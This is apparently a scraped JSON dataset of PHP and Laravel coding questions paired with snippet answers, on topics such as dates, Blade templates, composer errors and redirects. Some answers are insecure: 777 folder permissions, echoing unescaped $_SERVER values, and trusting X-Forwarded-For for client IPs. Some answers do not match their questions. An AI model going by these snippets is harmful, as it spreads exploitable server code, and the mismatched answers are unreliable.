[
  {
    "id": 1,
    "keyword": null,
    "link": "                                                ",
    "title": " \"DROP DATABASE\" statements are disabled.                                                ",
    "description": "//In \"config.default.php\" change false to true $cfg['AllowUserDropDatabase'] = true;\r\n    \r\n    \r\n\r\n                    \r\n                    ",
    "reg_date": "2021-11-01T15:02:56.000Z"
  },
  {
    "id": 2,
    "keyword": null,
    "link": null,
    "title": " $ GET[\"name\"]",
    "description": "<?php echo 'Hello ' . htmlspecialchars($_GET[\"name\"]) . '!'; ?>\n",
    "reg_date": "2021-10-12T10:12:00.000Z"
  },
  {
    "id": 3,
    "keyword": null,
    "link": null,
    "title": " $ Server php",
    "description": "$_SERVER['HTTP_REFERER'];\necho $_SERVER['PHP_SELF']; echo \"<br>\"; echo $_SERVER['SERVER_NAME']; echo \"<br>\"; echo $_SERVER['HTTP_HOST']; echo \"<br>\"; // echo $_SERVER['HTTP_REFERER']; echo \"<br>\"; echo $_SERVER['HTTP_USER_AGENT']; echo \"<br>\"; echo $_SERVER['SCRIPT_NAME'];\n<?php echo $_SERVER['PHP_SELF']; echo \"<br>\"; echo $_SERVER['SERVER_NAME']; echo \"<br>\"; echo $_SERVER['HTTP_HOST']; echo \"<br>\"; echo $_SERVER['HTTP_REFERER']; echo \"<br>\"; echo $_SERVER['HTTP_USER_AGENT']; echo \"<br>\"; echo $_SERVER['SCRIPT_NAME']; ?>\n<?php echo $_SERVER['SERVER_NAME']; ?>\n<?php   // PHP $_SERVER['...']; method      // PHP file name   echo 'PHP file name: '.$_SERVER['PHP_SELF'].'<br>';   // Server name   echo 'Server name: '.$_SERVER['SERVER_NAME'].'<br>';   // HTTP host   echo 'HTTP host: '.$_SERVER['HTTP_HOST'].'<br>';   // Refering link   echo 'Refering link: '.$_SERVER['HTTP_REFERER'].'<br>';   // User agent   echo 'User agent: '.$_SERVER['HTTP_USER_AGENT'].'<br>';   // Script name   echo 'Script name: '.$_SERVER['SCRIPT_NAME'];      // The rest is optional    if($_SERVER['PHP_SELF']=='/filename.php'){     //If there is no folder     echo 'No folder'.$_SERVER['PHP_SELF'];   } else{     // Echo the name of the folder containing the PHP file     echo 'PHP file name: '.$_SERVER['PHP_SELF'];   }      // The same if statements can be used for the script name      if($_SERVER['SCRIPT_NAME']=='/filename.php'){     // If there is no folder     echo 'No folder'.$_SERVER['SCRIPT_NAME'];   } else{     // Echo the name of the folder containing the PHP file     echo 'PHP file name: '.$_SERVER['SCRIPT_NAME'];   }      echo '<a href=\"repl.it/@CoolWebDev\">More from me...</a>';      // I hope you found this helpful!  ?>\n <?php /* Sometimes you will find that your website will not get the correct user IP after adding CDN, then this function will help you */ function real_ip() {    $ip = $_SERVER['REMOTE_ADDR'];     if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && preg_match_all('#\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {         foreach ($matches[0] AS $xip) {             if (!preg_match('#^(10|172\\.16|192\\.168)\\.#', $xip)) {                 $ip = $xip;                 break;             }         }     } elseif (isset($_SERVER['HTTP_CLIENT_IP']) && preg_match('/^([0-9]{1,3}\\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CLIENT_IP'])) {         $ip = $_SERVER['HTTP_CLIENT_IP'];     } elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && preg_match('/^([0-9]{1,3}\\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CF_CONNECTING_IP'])) {         $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];     } elseif (isset($_SERVER['HTTP_X_REAL_IP']) && preg_match('/^([0-9]{1,3}\\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_X_REAL_IP'])) {         $ip = $_SERVER['HTTP_X_REAL_IP'];     }     return $ip;  } echo real_ip();  ?>  \n",
    "reg_date": "2021-10-12T10:12:00.000Z"
  },
  {
    "id": 4,
    "keyword": null,
    "link": null,
    "title": " $ server 'remote addr' not working properly",
    "description": "if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {     $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR']; } else {     $ip_address = $_SERVER['REMOTE_ADDR']; }\n",
    "reg_date": "2021-10-12T10:12:00.000Z"
  },
  {
    "id": 5,
    "keyword": null,
    "link": null,
    "title": " $conn php",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n$servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\";   Simplified  $conn = mysqli_connect('localhost', 'username', 'password'); $database = mysqli_select_db($conn, 'database');\n<?php     $user = \"username\";     $pass = \"password\";     $host = \"host\";     $dbdb = \"database\";      $conn = new mysqli($host, $user, $pass, $dbdb);    if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); }  ?>\n",
    "reg_date": "2021-10-12T10:12:01.000Z"
  },
  {
    "id": 6,
    "keyword": null,
    "link": null,
    "title": " $errors show this error in laravel",
    "description": "@if($errors->any())     <div class=\"alert alert-danger\">         <p><strong>Opps Something went wrong</strong></p>         <ul>         @foreach ($errors->all() as $error)             <li>{{ $error }}</li>         @endforeach         </ul>     </div> @endif  @if(session('success'))     <div class=\"alert alert-success\">{{session('success')}}</div> @endif  @if(session('error'))     <div class=\"alert alert-danger\">{{session('error')}}</div> @endif \n@if(count($errors) > 0) <div class=\"p-1\">     @foreach($errors->all() as $error)     <div class=\"alert alert-warning alert-danger fade show\" role=\"alert\">{{$error}} <button type=\"button\" class=\"close\"             data-dismiss=\"alert\" aria-label=\"Close\">             <span aria-hidden=\"true\">&times;</span>         </button></div>     @endforeach </div> @endif\n@if($errors->any())     {{ implode('', $errors->all('<div>:message</div>')) }} @endif\n<input type=\"text\" name=\"firstname\"> @if($errors->has('firstname'))     <div class=\"error\">{{ $errors->first('firstname') }}</div> @endif \n",
    "reg_date": "2021-10-12T10:12:01.000Z"
  },
  {
    "id": 7,
    "keyword": null,
    "link": null,
    "title": " $loop variable laravel",
    "description": "<div>     @for ($i = 0; $i < $max; $i++) //Where $max is whatever you need as break condition.         <p>{{ $i }}</p> //This would print $i in a paragraph. You do whatever you need here.     @endfor </div>\n<ul> @foreach ($pages as $page)     <li>{{ $loop->iteration }}: {{ $page->title }}         @if ($page->hasChildren())         <ul>         @foreach ($page->children() as $child)             <li>{{ $loop->parent->iteration }}.{{ $loop->iteration }}:                 {{ $child->title }}</li>         @endforeach         </ul>         @endif     </li> @endforeach </ul>\nProperty\t\t\tDescription $loop->index\t\tThe index of the current loop iteration (starts at 0). $loop->iteration\tThe current loop iteration (starts at 1). $loop->remaining\tThe iterations remaining in the loop. $loop->count\t\tThe total number of items in the array being iterated. $loop->first\t\tWhether this is the first iteration through the loop. $loop->last\t\t\tWhether this is the last iteration through the loop. $loop->even\t\t\tWhether this is an even iteration through the loop. $loop->odd\t\t\tWhether this is an odd iteration through the loop. $loop->depth\t\tThe nesting level of the current loop. $loop->parent\t\tWhen in a nested loop, the parent's loop variable.\n",
    "reg_date": "2021-10-12T10:12:01.000Z"
  },
  {
    "id": 8,
    "keyword": null,
    "link": null,
    "title": " $posts- links() laravel design error",
    "description": "use Illuminate\\Pagination\\Paginator;  /**  * Bootstrap any application services.  *  * @return void  */ public function boot() {     Paginator::useBootstrap(); }\n",
    "reg_date": "2021-10-12T10:12:01.000Z"
  },
  {
    "id": 9,
    "keyword": null,
    "link": null,
    "title": " $this- attribute laravel",
    "description": "To define a mutator, define a setFooAttribute method on your model where Foo   is the \"studly\" cased name of the column you wish to access. So, again, lets define a mutator for the first_name attribute. This mutator will be automatically called when we attempt to set the value of the first_name attribute on the model:  class User extends Model {     public function setFirstNameAttribute($value)     {         $this->attributes['first_name'] = strtolower($value);     } }\n",
    "reg_date": "2021-10-12T10:12:01.000Z"
  },
  {
    "id": 10,
    "keyword": null,
    "link": null,
    "title": " $this",
    "description": " <?php class Test {     static public function getNew()     {         return new static;     } }  class Child extends Test {}  $obj1 = new Test(); $obj2 = new $obj1; var_dump($obj1 !== $obj2);  $obj3 = Test::getNew(); var_dump($obj3 instanceof Test);  $obj4 = Child::getNew(); var_dump($obj4 instanceof Child); ?>  \n",
    "reg_date": "2021-10-12T10:12:01.000Z"
  },
  {
    "id": 11,
    "keyword": null,
    "link": null,
    "title": " $tmpmembershipfee = MembershipFee::orderBy('created at','DESC') \t\t\t\t\t\t\t->first();",
    "description": "$tmpmembershipfee = MembershipFee::orderBy('created_at','DESC')->first();\ndata:{'User':{'id':id}}\n",
    "reg_date": "2021-10-12T10:12:01.000Z"
  },
  {
    "id": 12,
    "keyword": null,
    "link": null,
    "title": " 'cross-env' is not recognized as an internal or external command, laravel",
    "description": "npm install -global cross-env npm install --no-bin-links\n",
    "reg_date": "2021-10-12T10:12:01.000Z"
  },
  {
    "id": 13,
    "keyword": null,
    "link": null,
    "title": " 'https://', 'www.' & all sub derictories reomve from a url with regex",
    "description": "<?php      $url = \"https:// http://www.app.azonedev.com/somet hing/nothi     ng\";     $url_to_main_domain = preg_replace('/(https|http|:|\\/\\/|www.|\\s)/i','',$url);     $remove_sub_dir_from_url = preg_replace('/(\\/).*/','',$url_to_main_domain);     echo $remove_sub_dir_from_url;\n",
    "reg_date": "2021-10-12T10:12:02.000Z"
  },
  {
    "id": 14,
    "keyword": null,
    "link": null,
    "title": " 'laravel'",
    "description": "//There are two ways to install laravel  //1-install laravel with Composer composer create-project laravel/laravel example-app     // or     //2-install laravel with Laravel Installer composer global require laravel/installer laravel new example-app       // go to the project  cd example-app \ncomposer global require \"laravel/installer=~1.1\"\n",
    "reg_date": "2021-10-12T10:12:02.000Z"
  },
  {
    "id": 15,
    "keyword": null,
    "link": null,
    "title": " 'mix' is not recognized as an internal or external command,",
    "description": "npm install laravel-mix@latest --save-dev\nnpm install laravel-mix@latest --save-dev \n",
    "reg_date": "2021-10-12T10:12:02.000Z"
  },
  {
    "id": 16,
    "keyword": null,
    "link": null,
    "title": " 'mix' is not recognized as an internal or external command,laravel 8 npm run dev",
    "description": "npm install laravel-mix@latest --save-dev \n",
    "reg_date": "2021-10-12T10:12:02.000Z"
  },
  {
    "id": 17,
    "keyword": null,
    "link": null,
    "title": " 'mix' is not recognized as an internal or external command",
    "description": "npm install laravel-mix@latest --save-dev\nnpm install gh-pages  to deploy  add this to package.json  \"predeploy\": \"npm run build\",  \"deploy\": \"gh-pages -d build\"  and then this  npm run deploy\nnpm install laravel-mix@latest --save-dev \nDid you add python to PATH when you downloaded it? If not, redownload it and make sure you tick the box that says 'add Python to PATH'.\n",
    "reg_date": "2021-10-12T10:12:02.000Z"
  },
  {
    "id": 18,
    "keyword": null,
    "link": null,
    "title": " +1 month php",
    "description": "$time = strtotime(\"2010.12.11\"); $final = date(\"Y-m-d\", strtotime(\"+1 month\", $time));\necho Date(\"Y-m-d\", strtotime(\"2013-01-01 +1 Month -1 Day\"));// 2013-01-31  echo Date(\"Y-m-d\", strtotime(\"2013-01-31 +1 Month -3 Day\")); // 2013-02-28  echo Date(\"Y-m-d\", strtotime(\"2013-01-31 +2 Month\")); // 2013-03-31  echo Date(\"Y-m-d\", strtotime(\"2013-01-31 +3 Month -1 Day\")); // 2013-04-30  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -1 Month -1 Day\")); // 2013-11-30  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -2 Month\")); // 2013-10-31  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -3 Month\")); // 2013-10-01  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -3 Month -1 Day\")); // 2013-09-30\n<?php $months = n; // Here n = &hellip;..-2,-1,0,1,2, &hellip;..(months to add or subtract) $years = n;  // Here n = &hellip;..-2,-1,0,1,2, &hellip;..(years to add or subtract) echo date('Y-m-28', mktime(0, 0, 0, date('m')+$months, 1, date('Y') + $years)); ?>\n",
    "reg_date": "2021-10-12T10:12:02.000Z"
  },
  {
    "id": 19,
    "keyword": null,
    "link": null,
    "title": " /laravel-2020-07-27.log\" could not be opened",
    "description": "give 777 permission to folder /var/www/php72/vector-consumer/storage/logs\n",
    "reg_date": "2021-10-12T10:12:02.000Z"
  },
  {
    "id": 20,
    "keyword": null,
    "link": null,
    "title": " : Unable to locate package php7.4-fpm",
    "description": "sudo apt install software-properties-common sudo add-apt-repository ppa:ondrej/php sudo apt update sudo apt install php7.4 php -v \n",
    "reg_date": "2021-10-12T10:12:02.000Z"
  },
  {
    "id": 21,
    "keyword": null,
    "link": null,
    "title": " <?php $date = new DateTime('2000-01-01'); echo $date->format('Y-m-d H:i:s'); ?>",
    "description": " <?php $date = new DateTime('2000-01-01'); echo $date->format('Y-m-d H:i:s'); ?>  \n",
    "reg_date": "2021-10-12T10:12:02.000Z"
  },
  {
    "id": 22,
    "keyword": null,
    "link": null,
    "title": " <?php     function pre r($array){     echo '<pre>     \tprint r($array);     echo</pre>>'",
    "description": "echo \"<pre>\";    print_r($myarray); echo \"</pre>\";\n",
    "reg_date": "2021-10-12T10:12:03.000Z"
  },
  {
    "id": 23,
    "keyword": null,
    "link": null,
    "title": " <?php echo do shortcode(' '); ?> with variable",
    "description": "$childrens = do_shortcode( '[products ids=\"'. $string . '\"]' ); \n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode');  \n",
    "reg_date": "2021-10-12T10:12:03.000Z"
  },
  {
    "id": 24,
    "keyword": null,
    "link": null,
    "title": " <br /><b>Notice</b>: Undefined variable: username in <b>G:\\xampp\\htdocs\\Online Class Platform\\students register.php</b> on line <b>166</b><br />",
    "description": "function sum() {   \t// args looks like: array(1,2,3)     $args = func_get_args();       return array_sum($args); }  echo sum(1,2,3);   // prints 6\nThere is no variable. thats the reason      function sum() {   \t// args looks like: array(1,2,3)     $args = func_get_args();       return array_sum($args); }  echo sum(1,2,3);   // prints 6  $name = isset($_POST['name']) ? $_POST['name'] : ''; if (isset($_POST['submit']) && $human == '4') {   \n$name = isset($_POST['name']) ? $_POST['name'] : ''; if (isset($_POST['submit']) && $human == '4') {   \n#change php version with your version apt install php7.4-bcmath  #nginx  systemctl restart nginx #For Apache systemctl restart apache2\nadd_compile_options(-pthread)\nSET(CMAKE_CXX_FLAGS \"${CMAKE_CXX_FLAGS} -pthread\")\n",
    "reg_date": "2021-10-12T10:12:03.000Z"
  },
  {
    "id": 25,
    "keyword": null,
    "link": null,
    "title": " ?? ' ' operator in php laravel",
    "description": "// Null Coalesce Operator in PHP (Laravel) - $statement ?? '' $categoryName = $category->name ?? 'Not Available';  // The above Statement is identical to this if/else statement if (isset($category->name)) {     $categoryName = $category->name; } else {     $categoryName  = 'Not Available'; }\n",
    "reg_date": "2021-10-12T10:12:03.000Z"
  },
  {
    "id": 26,
    "keyword": null,
    "link": null,
    "title": " ?? ternary operator in php",
    "description": "(Condition) ? (Statement1) : (Statement2); \n<?php $marks=40; print ($marks>=40) ? \"pass\" : \"Fail\"; ?>\necho $color = $color ?? 'red';\t//if value not exists then assign to them.\n<?php  $is_user_logged_in = false;  $title = $is_user_logged_in ? 'Logout' : 'Login';Code language: HTML, XML (xml)\n",
    "reg_date": "2021-10-12T10:12:03.000Z"
  },
  {
    "id": 27,
    "keyword": null,
    "link": null,
    "title": " @ in php to supress error in php",
    "description": "Retrofit retrofit = new Retrofit.Builder()        .baseUrl(https://api.themoviedb.org/3/)        .addConverterFactory(GsonConverterFactory.create())        .addCallAdapterFactory(RxJava2CallAdapterFactory.create())        .build();\n",
    "reg_date": "2021-10-12T10:12:03.000Z"
  },
  {
    "id": 28,
    "keyword": null,
    "link": null,
    "title": " [Doctrine\\DBAL\\DBALException]Unknown database type enum requested, Doctrine\\DBAL\\Platforms\\MySqlPlatform may not support it.",
    "description": "It is a known issue as stated in Laravel 5.1 documentation.      Note: Renaming columns in a table with a enum column is not currently supported.  It happens when you have a enum column in your database table. Whether you are trying to rename another column, or change another column to nullable, this bug will appear. It's an issue with Doctrine\\DBAL.  An easy fix for this is to just add this constructor method in your database migration file.  public function __construct() {     DB::getDoctrineSchemaManager()->getDatabasePlatform()->registerDoctrineTypeMapping('enum', 'string'); }  This will map all the ENUM columns to VARCHAR(), and the column will accept any string.      This worked for me on Laravel 5.1 and Laravel 5.3. I hope this bug can be fixed soon.  Credit to @Gmatkowski's answer at https://stackoverflow.com/a/32860409/1193201 \n",
    "reg_date": "2021-10-12T10:12:03.000Z"
  },
  {
    "id": 29,
    "keyword": null,
    "link": null,
    "title": " [InvalidArgumentException] Could not find package laravel/laravel with version 7.0 in a version installable using your PHP version, PHP extensions and Composer version.",
    "description": "composer create-project --prefer-dist laravel/laravel=\"7.*\" laravel7\n",
    "reg_date": "2021-10-12T10:12:03.000Z"
  },
  {
    "id": 30,
    "keyword": null,
    "link": null,
    "title": " {{Str::limit laravel",
    "description": "{{Str::limit($category->name, 20)}}  if to end     {{Str::limit($category->name, 20, $end='.......')}}               or    {{\\Illuminate\\Support\\Str::limit($category->name, 20)}}            \nuse Illuminate\\Support\\Str;  $truncated = Str::limit('The quick brown fox jumps over the lazy dog', 20 , ' ...');  // The quick brown fox...\n",
    "reg_date": "2021-10-12T10:12:03.000Z"
  },
  {
    "id": 31,
    "keyword": null,
    "link": null,
    "title": " {{count  laravel",
    "description": "      {{ $threads->count() }} \n      {{ count($threads) }} \n",
    "reg_date": "2021-10-12T10:12:03.000Z"
  },
  {
    "id": 32,
    "keyword": null,
    "link": null,
    "title": " “In fortify.php line 134:Class 'Laravel\\Fortify\\Features' not found ” Code Answer’s",
    "description": "composer require laravel/fortify\nphp artisan vendor:publish --provider=\"Laravel\\Fortify\\FortifyServiceProvider\"\n",
    "reg_date": "2021-10-12T10:12:04.000Z"
  },
  {
    "id": 33,
    "keyword": null,
    "link": null,
    "title": " -> in php",
    "description": "// Create a new instance of MyObject into $obj $obj = new MyObject(); // Set a property in the $obj object called thisProperty $obj->thisProperty = 'Fred'; // Call a method of the $obj object named getProperty $obj->getProperty();\nPHP =>   //The double arrow operator, =>    //Used as an access mechanism for arrays.   //The left side will have a corresponding value on the right side in array.    //This can be used to set values into a corresponding index of an array.    //The index can be a string or number. $myArray = array(     0 => 'Red',     1 => 'Orange',     2 => 'Yellow',     3 => 'Green' );\n//The -> operator, also known as the object operator is used to access the properties and methods for a specific object.  //  Besides, in simple words, the object operator -> is responsible for accessing an object method. // for example: you a class 'Point' with a 'calculatePoint' method   $obj = new Point(); // setting  a property of the Point class $obj->x = 'value'; $obj->y = 'value'; // Calling a any method from our $obj $obj->calculatePoint();  // Same implementation in Python pyoObj = Point() pyObj.x = 'value' pyObj.y = 'value'  pyObj.calculatePoint()    // you should have something like that in most languages,   // I mean the '.propery()' instead of '->property()'\n// Create a new instance of MyObject into $obj $obj = new MyObject(); // Set a property in the $obj object called thisProperty $obj->thisProperty = 'Fred'; // Call a method of the $obj object named getProperty $obj->getProperty(); \n",
    "reg_date": "2021-10-12T10:12:04.000Z"
  },
  {
    "id": 34,
    "keyword": null,
    "link": null,
    "title": " - The requested PHP extension ext-http * is missing from your system. Install or enable PHP's http extension.",
    "description": "find \"ext-http\": \"*\" in  composer.json and remve it\n",
    "reg_date": "2021-10-12T10:12:04.000Z"
  },
  {
    "id": 35,
    "keyword": null,
    "link": null,
    "title": " - root composer.json requires php ^7.1.3 but your php version (8.0.3) does not satisfy that requirement.",
    "description": "composer install --ignore-platform-reqs\nIt's becouse in your project in composer.json file you have:  \"require\": {     \"php\": \">=7.3\",     ..... }, Try to update this requirement to:  \"require\": {     \"php\": \"^7.3|^8.0\",     ..... },\n",
    "reg_date": "2021-10-12T10:12:04.000Z"
  },
  {
    "id": 36,
    "keyword": null,
    "link": null,
    "title": " 19 hours from now php",
    "description": "$date = date('h:i:s A', time()+36000); // time() returns a time in seconds already\n",
    "reg_date": "2021-10-12T10:12:04.000Z"
  },
  {
    "id": 37,
    "keyword": null,
    "link": null,
    "title": " 2 chiffres apres virgule php",
    "description": "round($number, 2); //ex: round(2.234, 2) => 2.23\n",
    "reg_date": "2021-10-12T10:12:04.000Z"
  },
  {
    "id": 38,
    "keyword": null,
    "link": null,
    "title": " 2 decimal round using php",
    "description": "// using round() function we can roundoff float values in php $value = 58.24365; round($value, 2); //result 58.24\nround(520.34345, 2);   // 520.34\n",
    "reg_date": "2021-10-12T10:12:04.000Z"
  },
  {
    "id": 39,
    "keyword": null,
    "link": null,
    "title": " 301 redirect",
    "description": "<?php // Permanent 301 Redirect via PHP \theader(\"HTTP/1.1 301 Moved Permanently\"); \theader(\"Location: http://domain.tld/new/location/\"); \texit(); ?>\n301, \"Moved Permanently\"&mdash;recommended for SEO 302, \"Found\" or \"Moved Temporarily\" Meta Refresh \nRedirect 301 /pagename.php http://www.domain.com/pagename.html\n#For apache .htaccess RewriteEngine On RewriteCond %{HTTPS} off RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n#In .htaccess    Redirect 301 /old-page https://www.example.com/new-page \n#http to https and www to non-www RewriteEngine On RewriteCond %{HTTPS} off [OR] RewriteCond %{HTTP_HOST} ^www\\. [NC] RewriteCond %{HTTP_HOST} ^(?:www\\.)?(.+)$ [NC] RewriteRule ^ https://%1%{REQUEST_URI} [L,NE,R=301]\n",
    "reg_date": "2021-10-12T10:12:04.000Z"
  },
  {
    "id": 40,
    "keyword": null,
    "link": null,
    "title": " 404 page in laravel",
    "description": "//step 1 ) create the errors/404.blade.php in view.  // step 2 ) go to Handler.php and replace the render function to belwo function.   public function render($request, Throwable $exception)     {         if ($exception instanceof AccessDeniedHttpException) {             return response(view('errors.404'), 404);         }         return parent::render($request, $exception);     }\n//Access error code in view  @if(isset($exception) && $exception->getStatusCode() == 404)  @endif\n/**  * Render an exception into an HTTP response.  *  * @param  \\Illuminate\\Http\\Request  $request  * @param  \\Exception  $exception  * @return \\Illuminate\\Http\\Response  */ public function render($request, Exception $exception) {     if ($this->isHttpException($exception)) {         if ($exception->getStatusCode() == 404) {             return response()->view('errors.' . '404', [], 404);         }     }       return parent::render($request, $exception); } \n",
    "reg_date": "2021-10-12T10:12:04.000Z"
  },
  {
    "id": 41,
    "keyword": null,
    "link": null,
    "title": " 413 error laravel",
    "description": "// Need to increase or set client_max_body_size in your nginx config file.  http {     #...         client_max_body_size 100m;     #... } // Restart nginx\n",
    "reg_date": "2021-10-12T10:12:05.000Z"
  },
  {
    "id": 42,
    "keyword": null,
    "link": null,
    "title": " 419 page expired laravel",
    "description": "dont forget to put @csrf in your form\n<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\"> //if not work composer dump-autoload\n<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\">\n$this->renderable(function (\\Exception $e) {     if ($e->getPrevious() instanceof \\Illuminate\\Session\\TokenMismatchException) {         return redirect()->route('login');     }; });\n",
    "reg_date": "2021-10-12T10:12:05.000Z"
  },
  {
    "id": 43,
    "keyword": null,
    "link": null,
    "title": " 419 unknown status",
    "description": "//It's an error of csrf token, there is multiples ways to fix it, too much to  //write a grepper answer on.  //419 : error of csrf token  //Common way to fix it, try this $.ajaxSetup({     headers: {         'X-CSRF-TOKEN': $('meta[name=\"csrf-token\"]').attr('content')     } });\nUse this in the head section:  <meta name=\"csrf-token\" content=\"{{ csrf_token() }}\">  and get the csrf token in ajax: $.ajaxSetup({   headers: {     'X-CSRF-TOKEN': $('meta[name=\"csrf-token\"]').attr('content')   } });\n",
    "reg_date": "2021-10-12T10:12:05.000Z"
  },
  {
    "id": 44,
    "keyword": null,
    "link": null,
    "title": " Accessing Local Website on Mobile (XAMPP)",
    "description": "// XAMPP ANDROID TESTING FROM SAME NETWORK / ROUTER IP ADDRESS php -S 0.0.0.0:8080 -t FOLDER_NAME_WHO_HAVE_INDEX_FILE_IN_IT\n// Access PC Localhost (XAMPP Server) from Mobile Phone php -S 0.0.0.0:8080 -t FOLDER_NAME_WHO_HAVE_INDEX_FILE_IN_IT\n",
    "reg_date": "2021-10-12T10:12:05.000Z"
  },
  {
    "id": 45,
    "keyword": null,
    "link": null,
    "title": " Add [nom] to fillable property to allow mass assignment",
    "description": "// you var are not fillable, you have to set them fillable  protected $fillable = ['var1', 'var2', 'etc'];  //now you can fill your vars\nprotected $fillable = ['title']; \n",
    "reg_date": "2021-10-12T10:12:05.000Z"
  },
  {
    "id": 46,
    "keyword": null,
    "link": null,
    "title": " Add 2 hours to current time in cakephp",
    "description": "DATE_ADD(MemberBookFacility.time, INTERVAL 1 hour) <= '  if (isset($data_search[\"time_start\"]) && !empty(trim($data_search[\"time_start\"]))) {   $conditions['TIME(MemberBookFacility.time) >= '] = $data_search[\"time_start\"];\t// date('H:i', strtotime($data_search[\"time_start\"])); }  if (isset($data_search[\"time_end\"]) && !empty(trim($data_search[\"time_end\"]))) {   $conditions['DATE_ADD(MemberBookFacility.time, INTERVAL 1 hour) <= '] = $data_search[\"time_end\"];\t// date('H:i', strtotime($data_search[\"time_end\"])); }\n",
    "reg_date": "2021-10-12T10:12:06.000Z"
  },
  {
    "id": 47,
    "keyword": null,
    "link": null,
    "title": " Add Laravel .env variable to Vue component",
    "description": "in windows :  thats worked for me without any require in webpack.mix  ... just add a new variable in env file with this prefix : MIX_  MIX_API_URL=http://laravel:8000 but need to restart php artisan serve and also restart npm run watch....    let api_url = process.env.MIX_API_URL;   console.log(\"my env variable:\");   console.log(api_url);\n",
    "reg_date": "2021-10-12T10:12:06.000Z"
  },
  {
    "id": 48,
    "keyword": null,
    "link": null,
    "title": " Add days to date in PHP",
    "description": "<?php  // PHP program to add days to $Date     // Declare a date  $date = \"2019-05-10\";     // Add days to date and display it  echo date('Y-m-d', strtotime($date. ' + 10 days'));     ?> \n$date = \"Mar 03, 2011\"; $date = strtotime($date); $date = strtotime(\"+7 day\", $date); echo date('M d, Y', $date);\n<?php   // adding extra days to date       // Steps: \t// 1) using carbon     // 2) using strtotime            //Step 1   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      $new_date = Carbon::parse($date->addDays(1); // adds extra day                                // Step 2   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      echo $new_date = date('Y M d h:i:s', strtotime($date. '+1 day')); ?>\n$start_date = \"2015/03/02\";   $date = strtotime($start_date); $date = strtotime(\"+7 day\", $date); echo date('Y/m/d', $date); \n$date = new DateTime('2020-11-24'); $date->add(new DateInterval(\"P9D\"));  echo $date->format('Y-m-d');\n$date = date('Y-m-d', strtotime(\"+1 day\")); \n",
    "reg_date": "2021-10-12T10:12:06.000Z"
  },
  {
    "id": 49,
    "keyword": null,
    "link": null,
    "title": " Adding or Subtracting Time",
    "description": "$dateTime = new DateTime('2016-01-01'); $dateTime->modify('+1 day'); echo $dateTime->format('Y-m-d H:i:s');` # Output: 2016-01-02 00:00:00  # You can as well use the constructor if you work on the current date:    $dateTime = new DateTime('+1d'); echo $dateTime->format('Y-m-d H:i:s');` # Output the current date plus one day.\n",
    "reg_date": "2021-10-12T10:12:06.000Z"
  },
  {
    "id": 50,
    "keyword": null,
    "link": null,
    "title": " Allowed memory size of 1610612736 bytes exhausted",
    "description": "export COMPOSER_MEMORY_LIMIT=-1\nset COMPOSER_MEMORY_LIMIT=-1 \nini_set('memory_limit', '-1'); \nphp -d memory_limit=-1 composer.phar require hwi/oauth-bundle php-http/guzzle6-adapter php-http/httplug-bundle \nphp -d memory_limit=-1 /usr/local/bin/composer install  \nphp --ini  nano /etc/php5/cli/php.ini (it could be different for you)  Search for memory_limit by (ctrl + w)    make memory_limit to -1 or 2G (depending on what you can increase to)    save by (ctrl + x) then enter \n",
    "reg_date": "2021-10-12T10:12:06.000Z"
  },
  {
    "id": 51,
    "keyword": null,
    "link": null,
    "title": " Allowed memory size of 1610612736 bytes exhausted (tried to allocate 4096 bytes) in phar:///usr/local/Cellar/composer/1.9.1/bin/composer/src/Composer/DependencyResolver/Solver.php on line 223 mac",
    "description": "export COMPOSER_MEMORY_LIMIT=-1\nphp --ini  nano /etc/php5/cli/php.ini (it could be different for you)  Search for memory_limit by (ctrl + w)    make memory_limit to -1 or 2G (depending on what you can increase to)    save by (ctrl + x) then enter \nFatal error: Allowed memory size of 1610612736 bytes exhausted  export COMPOSER_MEMORY_LIMIT=-1 and restart composer update \n;memory_limit=512M  \n",
    "reg_date": "2021-10-12T10:12:06.000Z"
  },
  {
    "id": 52,
    "keyword": null,
    "link": null,
    "title": " Allowed memory size of 1610612736 bytes exhausted (tried to allocate 4096 bytes) laravel",
    "description": "export COMPOSER_MEMORY_LIMIT=-1\nFatal error: Allowed memory size of 1610612736 bytes exhausted  export COMPOSER_MEMORY_LIMIT=-1 and restart composer update \n1. Firstly i find which php.ini is working because i was using multiple xampp,   so using : php --ini 2. after that in that file i updated the memory_limit = -1    \n",
    "reg_date": "2021-10-12T10:12:06.000Z"
  },
  {
    "id": 53,
    "keyword": null,
    "link": null,
    "title": " Allowed memory size of 1610612736 bytes exhausted 4096",
